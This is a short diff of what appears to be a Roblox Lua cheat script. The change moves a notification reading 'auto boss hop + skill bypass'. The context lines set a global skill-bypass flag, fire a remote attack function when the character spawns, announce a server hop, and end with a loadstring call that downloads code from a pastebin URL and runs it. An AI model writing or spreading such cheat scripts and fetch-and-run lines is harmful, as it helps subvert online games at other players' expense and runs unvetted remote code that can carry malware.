@@ -25,7 +25,7 @@ Player.CharacterAdded:Connect(function()
     task.wait(2)
     RemoteAttack(6)
 end)
-
+NotificationLibrary.CustomNotification("test", "auto boss hop + skill bypass", 9e9)
 _G.skillbypass = true
 
 coroutine.wrap(function()
@@ -79,7 +79,6 @@ po.ChildAdded:connect(function(a)
         until false
     end
 end)
-NotificationLibrary.CustomNotification("test", "auto boss hop + skill bypass", 9e9)
 wait(10)
 NotificationLibrary.CustomNotification("test", "server hop", 9e9)
 loadstring(game:HttpGet("https://pastebin.com/raw/VduBT2nt"))()
